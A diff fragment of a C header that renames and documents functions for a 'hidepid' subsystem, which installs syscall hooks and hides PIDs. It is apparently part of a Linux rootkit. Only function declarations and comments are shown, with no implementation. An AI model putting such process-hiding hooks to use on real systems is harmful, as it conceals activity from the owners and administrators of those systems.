@@ -4,22 +4,26 @@
 #include <linux/types.h>
 
 /**
- * Initializes the subsystem that implements process hiding. This function is
- * a singleton, it should be called just once.
+ * Initializes the hidepid subsystem.
  *
  * @return: Zero on success, non-zero elsewhere.
  */
-int init_hidepid(void);
+int hidepid_init(void);
 
 /**
- * Stops the hidepid subsystem, freeing all the resources taken. This function
- * is a singleton, should be called just once.
+ * Termintes the use of hidepid subsystem.
  *
  * @return: Zero on success, non-zero elsewhere.
  */
-int stop_hidepid(void);
+int hidepid_finish(void);
 
-int hidepid_install_syscalls(void);
+/**
+ * The hidepid subsystem implement a few syscall hooks. This function install
+ * them.
+ *
+ * @return: Zero on success, non-zero elsewhere.
+ */
+int hidepid_install_hooks(void);
 
 /**
  * Hides a pid in the system.
